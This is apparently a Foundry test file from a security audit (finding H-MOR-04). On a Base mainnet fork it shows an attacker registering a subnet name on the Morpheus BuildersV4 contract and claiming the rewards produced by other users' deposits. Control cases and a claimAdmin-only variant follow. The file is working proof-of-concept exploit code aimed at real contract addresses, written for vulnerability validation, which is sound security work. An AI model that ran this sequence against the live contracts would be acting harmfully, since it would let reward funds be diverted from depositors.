// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vm, IERC20, IFeeConfig, IBuilders, ITreasury} from "../src/Interfaces.sol";

// H-MOR-04 validation: subnet-name squatting on BuildersV4 (Base).
// FORK-ONLY (Base mainnet fork pinned at block 56,040,152). No live transactions.
// Attacker / depositors / strangers are all fresh unprivileged addresses.
// No prank is ever used as owner/admin/multisig; prank only impersonates the
// fresh test addresses' own calls. Third-party depositors are simulated:
// their MOR is provisioned with the forge-std ERC20 "deal" method
// (storage-slot probing via vm.load/vm.store, the way StdCheats.deal works).

abstract contract SquatBase {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    // Public Base archive RPC used by default. Override with the BASE_RPC_URL
    // environment variable to use any other public Base archive endpoint
    // (e.g. https://base.drpc.org). No API key or private URL is required.
    string internal constant RPC_DEFAULT = "https://base-mainnet.public.blastapi.io";
    uint256 internal constant PIN_BLOCK = 56040152; // recon snapshot

    function rpc() internal returns (string memory) {
        return vm.envOr("BASE_RPC_URL", RPC_DEFAULT);
    }
    uint256 internal constant PRECISION = 1e25; // solarity Globals

    address internal constant BUILDERS = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address internal constant TREASURY = 0x9eba628581896ce086cb8f1A513ea6097A8FC561;
    address internal constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address internal constant FEE_CONFIG = 0x845FBB4B3e2207BF03087b8B94D2430AB11088eE;

    uint256 internal constant LOCK = 604800; // == minimalWithdrawLockPeriod read on-fork

    event R(string k, uint256 v);
    event RA(string k, address v);
    event RB(string k, bytes32 v);

    function check(bool cond, string memory msg_) internal pure {
        require(cond, msg_);
    }

    function absDiff(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a - b : b - a;
    }

    /// forge-std StdCheats-style ERC20 deal: probe the balance mapping slot, store the amount.
    function dealMOR(address user, uint256 amount) internal {
        for (uint256 i = 0; i < 30; i++) {
            bytes32 loc = keccak256(abi.encode(user, i));
            bytes32 prev = vm.load(MOR, loc);
            vm.store(MOR, loc, bytes32(amount));
            if (IERC20(MOR).balanceOf(user) == amount) return;
            vm.store(MOR, loc, prev);
        }
        revert("dealMOR: balance slot not found");
    }

    function claimFeeFor(uint256 pending) internal view returns (uint256 fee, uint256 feePart, address feeTreasury) {
        (feePart, feeTreasury) = IFeeConfig(FEE_CONFIG).getFeeAndTreasuryForOperation(BUILDERS, bytes32("claim"));
        fee = (pending * feePart) / PRECISION;
    }

    function assertNameUnregistered(IBuilders b, string memory name) internal view returns (bytes32 id, bytes32 idOld) {
        id = b.getSubnetId(name);
        idOld = b.getSubnetIdOld(name);
        (, address adminNew, , , , , ) = b.subnets(id);
        (, address adminOld, , , , , ) = b.subnets(idOld);
        check(adminNew == address(0), "name already registered (new ID)");
        check(adminOld == address(0), "name already registered (old ID)");
    }

    function createAs(address creator, string memory name, address admin, address claimAdmin) internal returns (bytes32 id) {
        IBuilders b = IBuilders(BUILDERS);
        id = b.getSubnetId(name);
        IBuilders.Subnet memory s = IBuilders.Subnet({
            name: name,
            admin: admin,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(LOCK),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: claimAdmin
        });
        IBuilders.SubnetMetadata memory m = IBuilders.SubnetMetadata({
            slug: name, description: "fork test subnet", website: "", image: ""
        });
        vm.prank(creator);
        b.createSubnet(s, m);
    }

    function depositAs(address user, bytes32 id, uint256 amount) internal {
        vm.prank(user);
        IERC20(MOR).approve(BUILDERS, amount);
        vm.prank(user);
        IBuilders(BUILDERS).deposit(id, amount);
    }

    function depositedOf(address user, bytes32 id) internal view returns (uint256 dep) {
        (, , dep, ) = IBuilders(BUILDERS).usersData(user, id);
    }
}

/*//////////////////////////////////////////////////////////////
    (a) MAIN SQUAT SCENARIO + Step-1 preconditions
    (b) NEGATIVE CONTROL inside the same scenario
//////////////////////////////////////////////////////////////*/
contract SquatMainTest is SquatBase {
    address internal attacker = address(uint160(0xA77AC401));
    address internal dep1 = address(uint160(0xDE9101));
    address internal dep2 = address(uint160(0xDE9102));
    address internal stranger = address(uint160(0x57A9E1));
    string internal constant NAME = "NovaComputeLab";

    function setUp() public {
        vm.createSelectFork(rpc(), PIN_BLOCK);
    }

    // Stage-3 Step 1: creation fee read + name unregistered under BOTH ID schemes.
    function testStep1Preconditions() public {
        IBuilders b = IBuilders(BUILDERS);
        uint256 feeAmt = b.subnetCreationFeeAmount();
        emit R("step1_subnetCreationFeeAmount_wei", feeAmt);
        check(feeAmt == 0, "creation fee is not 0 at pin (recorded value above)");
        check(b.minimalWithdrawLockPeriod() == LOCK, "minimal lock changed");
        (bytes32 id, bytes32 idOld) = assertNameUnregistered(b, NAME);
        emit RB("step1_subnetId_new", id);
        emit RB("step1_subnetId_old", idOld);
        emit R("step1_name_unregistered_both_schemes_1yes", 1);
    }

    function _setupSquattedSubnet() internal returns (bytes32 id) {
        IBuilders b = IBuilders(BUILDERS);
        assertNameUnregistered(b, NAME);
        dealMOR(dep1, 100000 ether);
        dealMOR(dep2, 100000 ether);
        // Attacker is dealt NOTHING and approves nothing beyond createSubnet (fee = 0).
        id = createAs(attacker, NAME, attacker, attacker);
        (, address admin, , , , , address claimAdmin) = b.subnets(id);
        check(admin == attacker, "admin not attacker");
        check(claimAdmin == attacker, "claimAdmin not attacker");
        emit RA("squat_admin", admin);
        emit RA("squat_claimAdmin", claimAdmin);
        depositAs(dep1, id, 100000 ether);
        depositAs(dep2, id, 100000 ether);
        check(depositedOf(dep1, id) == 100000 ether, "dep1 deposit missing");
        check(depositedOf(dep2, id) == 100000 ether, "dep2 deposit missing");
        check(depositedOf(attacker, id) == 0, "attacker deposited (must be 0)");
    }

    // (a) End-to-end: squat -> third-party deposits -> warp 30 days -> attacker claims all.
    function testMainSquatEndToEnd() public {
        IBuilders b = IBuilders(BUILDERS);
        bytes32 id = _setupSquattedSubnet();

        vm.warp(block.timestamp + 30 days);

        uint256 pending = b.getCurrentSubnetRewards(id);
        emit R("pendingRewards_before_claim_wei", pending);
        check(pending > 1 ether, "pendingRewards dust/negligible");
        (uint256 fee, uint256 feePart, ) = claimFeeFor(pending);
        emit R("claim_feePart", feePart);
        emit R("claim_fee_wei", fee);
        uint256 expected = pending - fee;

        uint256 treasuryBefore = IERC20(MOR).balanceOf(TREASURY);
        emit R("treasury_balance_before_wei", treasuryBefore);
        check(treasuryBefore >= pending, "treasury cannot cover pending");
        check(IERC20(MOR).balanceOf(attacker) == 0, "attacker MOR before claim not 0");

        vm.prank(attacker);
        b.claim(id, attacker);

        uint256 delta = IERC20(MOR).balanceOf(attacker);
        emit R("attacker_MOR_delta_wei", delta);
        emit R("expected_delta_wei", expected);
        check(delta == expected, "attacker delta != pendingRewards - claimFee");
        check(depositedOf(attacker, id) == 0, "attacker deposits != 0 after claim");
        (, , , , uint256 pendingAfter) = b.subnetsData(id);
        check(pendingAfter == 0, "subnet pendingRewards not zeroed by claim");
        uint256 treasuryDelta = treasuryBefore - IERC20(MOR).balanceOf(TREASURY);
        emit R("treasury_outflow_wei", treasuryDelta);
        check(treasuryDelta == pending, "treasury outflow != gross pendingRewards");
        // Capture fraction (per-mille): attacker delta / gross pending.
        emit R("capture_per_mille_of_pending", (delta * 1000) / pending);
    }

    // (b) Negative control: non-admin/non-claimAdmin claim attempts must fail;
    //     pending stays intact; the squatted admin then claims it (binding, not a generic bug).
    function testNegativeControlNonAdminCannotClaim() public {
        IBuilders b = IBuilders(BUILDERS);
        bytes32 id = _setupSquattedSubnet();
        vm.warp(block.timestamp + 30 days);
        uint256 pending = b.getCurrentSubnetRewards(id);
        check(pending > 1 ether, "pending dust");

        // Bypass attempt 1: total stranger claims to himself.
        vm.prank(stranger);
        vm.expectRevert();
        b.claim(id, stranger);
        // Bypass attempt 2: an actual depositor (who funded the rewards) claims to himself.
        vm.prank(dep1);
        vm.expectRevert();
        b.claim(id, dep1);

        check(b.getCurrentSubnetRewards(id) == pending, "pending changed by failed claims");
        check(IERC20(MOR).balanceOf(stranger) == 0, "stranger got MOR");
        // dep1 spent all dealt MOR on the deposit, so any MOR now would be claim proceeds.
        check(IERC20(MOR).balanceOf(dep1) == 0, "depositor got MOR from failed claim");

        // The squatted admin binding is what pays out:
        (uint256 fee, , ) = claimFeeFor(pending);
        vm.prank(attacker);
        b.claim(id, attacker);
        check(IERC20(MOR).balanceOf(attacker) == pending - fee, "admin claim after controls failed");
        emit R("negcontrol_attacker_delta_wei", pending - fee);
    }

    // Mitigation check: duplicate registration of the same (now squatted) name reverts for
    // everyone else -- uniqueness protects the FIRST registrant, i.e. the squatter.
    function testDuplicateRegistrationReverts() public {
        bytes32 id = _setupSquattedSubnet();
        emit RB("dupcheck_subnetId", id);
        IBuilders.Subnet memory s = IBuilders.Subnet({
            name: NAME,
            admin: stranger,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: uint128(LOCK),
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: stranger
        });
        IBuilders.SubnetMetadata memory m = IBuilders.SubnetMetadata({
            slug: NAME, description: "dup attempt", website: "", image: ""
        });
        vm.prank(stranger);
        vm.expectRevert();
        IBuilders(BUILDERS).createSubnet(s, m);
    }
}

/*//////////////////////////////////////////////////////////////
    (c) BASELINE CONTROL: identical flow, subnet NOT controlled
    by the attacker -> attacker receives exactly zero.
//////////////////////////////////////////////////////////////*/
contract BaselineControlTest is SquatBase {
    address internal attacker = address(uint160(0xA77AC402));
    address internal legit = address(uint160(0x1E6171));
    address internal dep1 = address(uint160(0xDE9201));
    address internal dep2 = address(uint160(0xDE9202));
    string internal constant NAME = "HonestBuilderLab";

    function setUp() public {
        vm.createSelectFork(rpc(), PIN_BLOCK);
    }

    function testBaselineAttackerGetsZero() public {
        IBuilders b = IBuilders(BUILDERS);
        assertNameUnregistered(b, NAME);
        dealMOR(dep1, 100000 ether);
        dealMOR(dep2, 100000 ether);
        bytes32 id = createAs(legit, NAME, legit, legit);
        depositAs(dep1, id, 100000 ether);
        depositAs(dep2, id, 100000 ether);
        vm.warp(block.timestamp + 30 days);

        uint256 pending = b.getCurrentSubnetRewards(id);
        emit R("baseline_pendingRewards_wei", pending);
        check(pending > 1 ether, "baseline pending dust");
        (uint256 fee, , ) = claimFeeFor(pending);

        vm.prank(legit);
        b.claim(id, legit);
        check(IERC20(MOR).balanceOf(legit) == pending - fee, "legit admin claim mismatch");
        check(IERC20(MOR).balanceOf(attacker) == 0, "attacker got MOR in baseline");
        check(depositedOf(attacker, id) == 0, "attacker deposited in baseline");
        emit R("baseline_attacker_MOR_delta_wei", 0);
        emit R("baseline_legit_delta_wei", pending - fee);
    }
}

/*//////////////////////////////////////////////////////////////
    (d) SECOND NAME + claimAdmin-ONLY variation + legacy-ID check:
    attacker is claimAdmin but NOT admin; claim still pays him.
//////////////////////////////////////////////////////////////*/
contract ClaimAdminOnlyTest is SquatBase {
    address internal attacker = address(uint160(0xA77AC403));
    address internal nominalAdmin = address(uint160(0xAD9111));
    address internal dep1 = address(uint160(0xDE9301));
    address internal dep2 = address(uint160(0xDE9302));
    string internal constant NAME = "OpenBuilderCollective";

    function setUp() public {
        vm.createSelectFork(rpc(), PIN_BLOCK);
    }

    function testClaimAdminOnlySecondName() public {
        IBuilders b = IBuilders(BUILDERS);
        (bytes32 id, bytes32 idOld) = assertNameUnregistered(b, NAME);
        emit RB("var2_subnetId_new", id);
        emit RB("var2_subnetId_old_legacy_unregistered", idOld);
        dealMOR(dep1, 50000 ether);
        dealMOR(dep2, 50000 ether);
        bytes32 sid = createAs(attacker, NAME, nominalAdmin, attacker);
        check(sid == id, "created id mismatch");
        (, address admin, , , , , address claimAdmin) = b.subnets(sid);
        check(admin == nominalAdmin && admin != attacker, "admin setup wrong");
        check(claimAdmin == attacker, "claimAdmin setup wrong");
        depositAs(dep1, sid, 50000 ether);
        depositAs(dep2, sid, 50000 ether);
        vm.warp(block.timestamp + 7 days);

        uint256 pending = b.getCurrentSubnetRewards(sid);
        emit R("var2_pendingRewards_wei", pending);
        check(pending > 0.1 ether, "var2 pending dust");
        (uint256 fee, , ) = claimFeeFor(pending);
        vm.prank(attacker); // claimAdmin, NOT admin
        b.claim(sid, attacker);
        uint256 delta = IERC20(MOR).balanceOf(attacker);
        emit R("var2_attacker_delta_wei", delta);
        check(delta == pending - fee, "claimAdmin-only claim mismatch");
        check(depositedOf(attacker, sid) == 0, "var2 attacker deposits != 0");
        emit R("var2_capture_per_mille_of_pending", pending == 0 ? 0 : (delta * 1000) / pending);
    }
}
